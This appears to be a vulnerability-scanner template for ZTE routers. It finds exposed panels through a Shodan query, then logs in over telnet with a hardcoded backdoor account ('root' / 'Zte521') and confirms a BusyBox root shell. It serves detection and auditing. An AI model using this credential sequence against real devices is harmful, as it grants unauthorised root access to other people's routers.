id: backdoored-zte
info:
  author: its0x08
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-912
  description: 'Multiple ZTE router panels were detected. These routers have a telnet-hardcoded
    backdoor account that spawns root shell.

    '
  metadata:
    max-request: 1
    shodan-query: http.html:"ZTE Corporation"
    verified: true
  name: ZTE Router Panel - Detect
  reference:
  - https://www.exploit-db.com/ghdb/7179
  severity: critical
  tags: edb,network,zte,telnet,backdoor,router
tcp:
- extractors:
  - regex:
    - '[A-Z]{1,}[0-9]{3,4}'
    type: regex
  host:
  - '{{Hostname}}'
  inputs:
  - data: "root\r\n"
  - data: "Zte521\r\n\r\n"
    read: 1024
  matchers:
  - type: word
    words:
    - BusyBox
  port: 23
